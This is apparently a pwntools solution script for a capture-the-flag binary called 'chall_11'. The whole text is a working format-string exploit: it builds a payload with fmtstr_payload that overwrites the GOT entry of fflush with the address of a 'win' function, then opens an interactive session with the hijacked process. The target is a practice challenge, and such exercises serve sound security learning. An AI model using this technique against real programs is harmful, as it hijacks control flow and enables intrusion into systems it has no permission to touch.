from pwn import *

def main():
	binary = context.binary = ELF("./chall_11")
	p = process("./chall_11")
	print(p.recv())
	p.sendline()
	payload = fmtstr_payload(6, {binary.got.fflush:binary.sym.win})
	p.sendline(payload)
	p.interactive()
main()
